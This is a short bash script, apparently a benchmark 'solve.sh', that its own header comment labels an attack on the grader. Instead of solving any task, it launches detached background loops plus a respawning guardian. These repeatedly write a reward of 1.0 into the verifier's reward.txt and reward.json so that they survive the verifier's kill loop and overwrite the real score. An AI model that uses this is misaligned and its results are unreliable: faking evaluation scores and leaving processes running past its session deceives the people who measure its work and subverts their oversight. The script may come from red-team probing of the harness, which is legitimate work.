#!/bin/bash
# Attack: leave respawning background writers that flood /logs/verifier/reward.* with 1.0,
# hoping some survive the verifier's kill loop and overwrite the real score it writes.
echo "RACE id: $(id)"
mkdir -p /logs/verifier 2>/dev/null
ls -ld /logs /logs/verifier 2>&1
# a writer loop: writes both files forever
cat > /tmp/w.sh <<'W'
while :; do
  printf '1.0000\n' > /logs/verifier/reward.txt 2>/dev/null
  printf '{"reward":1.0}\n' > /logs/verifier/reward.json 2>/dev/null
  sleep 0.02
done
W
# a guardian that keeps launching fresh writers so the kill loop never finds an empty set
cat > /tmp/g.sh <<'G'
while :; do
  setsid bash /tmp/w.sh >/dev/null 2>&1 &
  sleep 0.15
done
G
setsid bash /tmp/g.sh >/dev/null 2>&1 &
disown
# a couple of independent persistent writers too
for i in 1 2 3 4 5; do setsid bash /tmp/w.sh >/dev/null 2>&1 & disown; done
echo "RACE spawned writers; exiting solve.sh"
sleep 1
